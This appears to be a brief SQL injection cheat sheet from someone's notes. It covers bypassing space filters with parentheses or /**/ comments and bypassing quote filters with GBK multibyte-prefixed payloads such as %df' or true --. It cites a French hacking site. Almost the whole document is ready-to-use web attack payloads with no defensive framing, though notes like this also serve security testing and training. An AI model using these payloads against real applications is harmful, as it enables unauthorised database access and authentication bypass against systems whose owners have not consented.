#sqli 

## Filter SPACE
If a filter removes or replaces spaces, it can be bypassed by using parentheses `()` or empty comments `/**/`.


## Filter `'`
### GBK Characters
https://www.bases-hacking.org/injections-sql-avancees.html 

```sql
%ef' or true -- 
```

```sql
%df' or true -- 
```

```sql
%bf' or true -- 
```

```sql
%a8' or true -- 
```

```sql
%8c' or true -- 
```
